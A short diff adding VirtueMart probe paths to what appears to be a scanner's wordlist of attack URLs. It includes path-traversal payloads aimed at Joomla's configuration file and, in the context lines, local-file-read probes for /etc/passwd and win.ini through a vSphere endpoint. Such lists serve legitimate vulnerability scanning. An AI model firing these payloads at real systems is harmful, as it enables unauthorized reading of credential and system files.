@@ -934,3 +934,6 @@
 /vsphere-client/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///etc/passwd
 /vsphere-client/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///c%3a/windows/win.ini
 /graph_image.php?local_graph_id=1&rra_id=0&show_source=1&graph_theme=midwinter/.
+/modules/mod_virtuemart_cart/mod_virtuemart_cart.xml
+/index.php?option=com_virtuemart&view=../../../nonexistent&tmpl=component
+/index.php?option=com_virtuemart&view=../../../configuration&tmpl=component
